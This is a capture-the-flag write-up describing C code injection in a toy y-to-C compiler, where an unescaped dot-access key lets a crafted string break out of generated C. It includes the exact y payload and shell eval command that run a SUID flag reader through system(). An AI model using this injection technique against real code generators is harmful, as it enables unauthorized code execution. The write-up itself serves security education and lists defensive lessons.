# PwnSec CTF 2026 — ycc: C Code Injection via Unescaped Dot Key

**Category:** Misc/Easy (500 pts)
**Flag:** `pwnsec{d79838464391c7b2}`
**Date:** 2026-09-12

## Challenge
A self-hosted y→C compiler ("ycc") with an interactive shell ("ysh"). The `eval` command compiles user y code with `--no-exec --no-io` (removing exec/spawn/read_file/write_file/getenv from the *generated program's* scope), then runs the compiled binary. Goal: run `/readflag owo` (SUID root).

## Vulnerability
**C code injection in `emit_dot` (yfn_45)** — the code generator for dot-access expressions (`obj.key`) concatenates the key **raw into generated C code** without calling the `esc()` escape function (which every other codegen path uses):

```c
y_map_get(_m, "<KEY>");  // KEY NOT escaped
fprintf(stderr, "runtime error: key '<KEY>' not found\n");  // KEY NOT escaped
```

**Parser accepts any token after `.`** — `parse_postfix` (yfn_22) does `tv(toks, pos + 1)` without type-checking, so `a."<string>"` produces a dot node whose key is the decoded string content.

**y lexer decodes escapes** — `\"` → `"` inside string literals, enabling the breakout.

## Exploit
y source:
```
let a = { x: 1 };
a."x\"); YValue *_pwn = y_mk_null(); system(\"/readflag owo\"); _pwn; }); //"
```

The y lexer decodes the string to KEY = `x"); YValue *_pwn = y_mk_null(); system("/readflag owo"); _pwn; }); //`. emit_dot generates:

```c
({ YValue *_m = y_clone(y_scope_get(scope, "a")); YValue *_v = y_map_get(_m, "x"); YValue *_pwn = y_mk_null(); system("/readflag owo"); _pwn; }); //"); if (!_v) { ... } ... })
```

The `//` comments out the rest of the line. Effective C:
```c
({ YValue *_m = y_clone(y_scope_get(scope, "a")); YValue *_v = y_map_get(_m, "x"); YValue *_pwn = y_mk_null(); system("/readflag owo"); _pwn; });
```

Compiled and run → `system("/readflag owo")` → SUID root prints flag.

## Key Command (ysh)
```
eval "let a = { x: 1 }; a."x\"); YValue *_pwn = y_mk_null(); system(\"/readflag owo\"); _pwn; }); //""
```

Note: ysh's `cmd_eval` strips outer quotes, so the payload needs an extra trailing `"` to keep the y string literal closed.

## Key Lessons
1. **Sandbox scope vs compiler scope**: `--no-exec --no-io` only strips functions from the generated program's scope. The compiler process itself is unsandboxed — its code generator is the real attack surface.
2. **Audit codegen string concatenation**: every place user-controlled strings are concatenated into generated C must escape. One missing `esc()` call = full RCE.
3. **Parser token-type laxity**: `parse_postfix` accepting any token after `.` (not just identifiers) is what made the string-key injection possible.
4. **Shell-layer escaping**: when the payload passes through a shell that strips quotes, account for the extra quote needed to keep string literals closed.

## Files
- `exploit_ycc.py` — pwntools exploit
- `ycc_test*.py` — local verification scripts